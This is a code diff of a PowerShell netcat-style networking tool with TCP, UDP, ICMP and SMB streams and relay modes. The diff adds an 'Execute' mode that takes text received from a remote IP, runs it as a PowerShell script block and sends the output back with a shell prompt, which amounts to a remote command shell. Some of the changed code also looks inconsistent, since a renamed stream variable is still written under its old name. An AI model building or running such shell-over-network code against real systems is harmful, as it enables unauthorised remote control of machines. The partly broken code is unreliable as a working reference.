@@ -11,9 +11,9 @@
         [Alias("c")]
         [String]$RemoteIp,
         
-        [Parameter(ParameterSetName = 'ScriptBlock')]
-        [Alias("sb")]
-        [ScriptBlock]$ScriptBlock,
+        [Parameter(ParameterSetName = 'Execute')]
+        [Alias('e')]
+        [Switch]$Execute,
     
         [Parameter(ParameterSetName = 'Input')]
         [Alias("i")]
@@ -29,8 +29,8 @@
     
         [Parameter()]
         [Alias("o")]
-        [ValidateSet('Host','Bytes','String')]
-        [String]$OutputType = 'Host',
+        [ValidateSet('Bytes','String')]
+        [String]$OutputType = 'Bytes',
 
         [Parameter()]
         [Alias("of")]
@@ -47,8 +47,7 @@
         [Parameter()]
         [ValidateSet('Ascii','Unicode','UTF7','UTF8','UTF32')]
         [String]$Encoding = 'Ascii'
-    )    
-    
+    )       
     DynamicParam {
         $ParameterDictionary = New-Object Management.Automation.RuntimeDefinedParameterDictionary
         
@@ -59,7 +58,10 @@
             'Udp' { $PortParam = New-RuntimeParameter -Name Port -Type Int -Mandatory -Position 1 -ParameterDictionary $ParameterDictionary ; continue }
         }
 
-        if ($PSBoundParameters.ScriptBlock) { $ArgumentListParam = New-RuntimeParameter -Name ArgumentList -Type Object[] -ParameterDictionary $ParameterDictionary }
+        if ($Execute.IsPresent) { 
+            $ScriptBlockParam = New-RuntimeParameter -Name ScriptBlock -Type ScriptBlock -Mandatory -ParameterDictionary $ParameterDictionary 
+            $ArgumentListParam = New-RuntimeParameter -Name ArgumentList -Type Object[] -ParameterDictionary $ParameterDictionary 
+        }
 
         return $ParameterDictionary
     }
@@ -71,18 +73,31 @@
              'UTF8' { $EncodingType = New-Object Text.UTF8Encoding ; continue }
             'UTF32' { $EncodingType = New-Object Text.UTF32Encoding ; continue }
         }
+
+        if ($PSCmdlet.ParameterSetName -eq 'Execute') {
+            
+            Write-Verbose "Executing scriptblock..."
+
+            $ScriptBlock = $ParameterDictionary.ScriptBlock.Value
+            
+            try { $BytesToSend += $EncodingType.GetBytes(($ScriptBlock.Invoke($ParameterDictionary.ArgumentList.Value) | Out-String)) }
+            catch { $BytesToSend += $EncodingType.GetBytes(($_ | Out-String)) }
+            $BytesToSend += $EncodingType.GetBytes(("`nPS $((Get-Location).Path)> "))
+            
+            $ScriptBlock = $null
+        }
       
-        if ($PSCmdlet.ParameterSetName = 'Input') {   
+        elseif ($PSCmdlet.ParameterSetName -eq 'Input') {   
             
             Write-Verbose 'Parsing input...'
 
-            if ((Test-Path $Input)) { $InputToWrite = [IO.File]::ReadAllBytes($Input) }     
-            elseif ($Input.GetType().Name -eq 'Byte[]') { $InputToWrite = $Input }
-            elseif ($Input.GetType().Name -eq 'String') { $InputToWrite = $EncodingType.GetBytes($Input) }
+            if ((Test-Path $Input)) { $BytesToSend = [IO.File]::ReadAllBytes($Input) }     
+            elseif ($Input.GetType() -eq [Byte[]]) { $BytesToSend = $Input }
+            elseif ($Input.GetType() -eq [String]) { $BytesToSend = $EncodingType.GetBytes($Input) }
             else { Write-Warning 'Incompatible input type.' ; return }
         }
 
-        elseif ($PSCmdlet.ParameterSetName = 'Relay') {
+        elseif ($PSCmdlet.ParameterSetName -eq 'Relay') {
             
             Write-Verbose "Setting up relay stream..."
 
@@ -93,10 +108,11 @@
                 $RelayMode = $RelayConfig[0].ToLower()
 
                 switch ($RelayMode) {
-                       'icmp' { $RelayStream = New-IcmpStream -BindAddress $RelayConfig[1] ; continue }
-                        'smb' { $RelayStream = New-SmbStream -PipeName $RelayConfig[1] ; continue }
-                        'tcp' { $RelayStream = New-TcpStream -Port $RelayConfig[1] ; continue }
-                        'udp' { $RelayStream = New-UdpStream -Port $RelayConfig[1] ; continue }
+                   'icmp' { $RelayStream = New-IcmpStream -BindAddress $RelayConfig[1] ; continue }
+                    'smb' { $RelayStream = New-SmbStream -PipeName $RelayConfig[1] ; continue }
+                    'tcp' { $RelayStream = New-TcpStream -Port $RelayConfig[1] ; continue }
+                    'udp' { $RelayStream = New-UdpStream -Port $RelayConfig[1] ; continue }
+                    default { Write-Warning 'Invalid relay mode specified.' ; exit }
                 }
             }
             elseif ($RelayConfig.Count -eq 3) { # Client
@@ -104,10 +120,11 @@
                 $RelayMode = $RelayConfig[0].ToLower()
 
                 switch ($RelayMode) {
-                       'icmp' { $RelayStream = New-IcmpStream -RemoteIp $RelayConfig[2] -BindAddress $RelayConfig[1] ; continue }
-                        'smb' { $RelayStream = New-SmbStream -RemoteIp $RelayConfig[2] -PipeName $RelayConfig[1] ; continue }
-                        'tcp' { $RelayStream = New-TcpStream -RemoteIp $RelayConfig[2] -Port $RelayConfig[1] ; continue }
-                        'udp' { $RelayStream = New-UdpStream -RemoteIp $RelayConfig[2] -Port $RelayConfig[1] ; continue }
+                   'icmp' { $RelayStream = New-IcmpStream -RemoteIp $RelayConfig[2] -BindAddress $RelayConfig[1] ; continue }
+                    'smb' { $RelayStream = New-SmbStream -RemoteIp $RelayConfig[2] -PipeName $RelayConfig[1] ; continue }
+                    'tcp' { $RelayStream = New-TcpStream -RemoteIp $RelayConfig[2] -Port $RelayConfig[1] ; continue }
+                    'udp' { $RelayStream = New-UdpStream -RemoteIp $RelayConfig[2] -Port $RelayConfig[1] ; continue }
+                    default { Write-Warning 'Invalid relay mode specified.' ; exit }
                 }
             }
             else { Write-Error 'Invalid relay format.' -ErrorAction Stop }
@@ -115,33 +132,63 @@
           
         Write-Verbose "Setting up network stream..."
 
+        $ServerIp = [Net.IPAddress]::Parse($RemoteIp)
+
         switch ($Mode) {
            'Icmp' { 
-                try { $NetworkStream = New-IcmpStream -RemoteIp $RemoteIp -BindAddress $ParameterDictionary.BindAddress.Value }
+                try { $ClientStream = New-IcmpStream $ServerIp -BindAddress $ParameterDictionary.BindAddress.Value }
                 catch { Write-Warning "Failed to open network stream. $($_.Exception.Message)" ; break }
                 continue 
             }
             'Smb' { 
-                try { $NetworkStream = New-SmbStream -RemoteIp $RemoteIp -PipeName $ParameterDictionary.PipeName.Value  }
+                try { $ClientStream = New-SmbStream $ServerIp -PipeName $ParameterDictionary.PipeName.Value  }
                 catch { Write-Warning "Failed to open network stream. $($_.Exception.Message)" ; break }
                 continue 
             }
             'Tcp' { 
-                try { $NetworkStream = New-TcpStream -RemoteIp $RemoteIp -Port $Port  }
-                catch { Write-Warning "Failed to open network stream. $($_.Exception.Message)" ; break }
+                try { $ClientStream = New-TcpStream $ServerIp $Port }
+                catch { Write-Warning "Failed to open Tcp stream. $($_.Exception.Message)" ; exit }
                 continue 
             }
             'Udp' { 
-                try { $NetworkStream = New-UdpStream -RemoteIp $RemoteIp -Port $Port  }
-                catch { Write-Warning "Failed to open network stream. $($_.Exception.Message)" ; break }
+                try { $ClientStream = New-UdpStream $ServerIp $Port }
+                catch { Write-Warning "Failed to open Udp stream. $($_.Exception.Message)" ; exit }
                 continue 
             }
         }
     }
     Process {   
       
-        Write-Verbose "Setting up IO stream..."
+        if ($BytesToSend.Count) { Write-NetworkStream -Mode $Mode -Stream $ClientStream -Bytes $BytesToSend }
+
+        if ($ClientStream.Socket.Available -or $ClientStream.Pipe.InBufferSize) { 
+            
+            $ReceivedBytes = Read-NetworkStream -Mode $Mode -Stream $ClientStream
         
+            if ($PSCmdlet.ParameterSetName -eq 'Execute') {
+            
+                $ScriptBlock = [ScriptBlock]::Create($EncodingType.GetString($ReceivedBytes))
+            
+                $Error.Clear()
+
+                $BytesToSend += $EncodingType.GetBytes(($ScriptBlock.Invoke() | Out-String))
+                if ($Error) { foreach ($Err in $Error) { $BytesToSend += $EncodingType.GetBytes($Err.ToString()) } }
+                $BytesToSend += $EncodingType.GetBytes(("`nPS $((Get-Location).Path)> "))
+            
+                $ScriptBlock = $null
+
+                if ($BytesToSend.Count) { 
+                    Write-NetworkStream -Mode $Mode -Stream $NetworkStream -Bytes $BytesToSend 
+                    $BytesToSend = $null
+                }
+            }
+            elseif ($PSCmdlet.ParameterSetName -eq 'Relay') { Write-NetworkStream -Mode $RelayMode -Stream $RelayStream -Bytes $ReceivedBytes }
+            elseif ($PSBoundParameters.OutputFile) { 
+                if ($OutputType -eq 'Bytes') { $ReceivedBytes | Out-File -Append -FilePath $OutputFile }
+                elseif ($OutputType -eq 'String') { $EncodingType.GetString($ReceivedBytes) | Out-File -Append -FilePath $OutputFile }
+            }
+            else { Write-Output $ReceivedBytes }
+        }
         try { $IOStream = Open-IOStream $Stream2SetupVars }
         catch { Write-Warning "Failed to open IO stream. $($_.Exception.Message)" ; break }
       
